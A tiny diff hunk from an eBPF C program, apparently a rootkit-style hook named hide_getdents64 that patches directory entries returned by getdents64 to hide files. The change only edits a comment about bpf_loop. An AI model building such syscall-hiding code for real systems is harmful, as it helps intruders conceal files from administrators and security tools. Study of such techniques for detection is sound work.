@@ -96,7 +96,7 @@ int BPF_PROG(hide_getdents64, struct pt_regs *regs, long ret) {
         .prev_reclen = 0,
     };
 
-    /* Bounded execution using helper (Linux 5.17+) */
+    /* Bounded execution using helper */
     bpf_loop(MAX_DIRENTS, patch_dirent_cb, &lctx, 0);
 
     return 0;
